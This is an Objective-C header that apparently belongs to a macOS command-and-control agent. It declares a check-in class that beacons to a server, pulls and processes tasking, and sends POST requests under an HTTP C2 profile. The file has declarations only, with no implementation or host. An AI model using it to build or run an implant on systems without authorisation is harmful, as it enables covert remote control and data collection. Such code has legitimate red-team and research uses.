#import <Foundation/Foundation.h>
#include <complex.h>

#import "C2Task.h"
#import "../c2_profiles/HTTPC2Config.h"
#import "../system_info/SystemInfoHelper.h"

@interface C2CheckIn : NSObject

extern NSString *callbackUUID;

+ (void)performPlaintextCheckin;
+ (BOOL)getTasking;
+ (void)processTasksFromResponse:(NSDictionary *)taskingResponse;
+ (void)sendPOSTRequestWithURL:(NSURL *)url
                       payload:(NSDictionary *)payload
                       headers:(NSDictionary *)headers
                    completion:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completion;

@end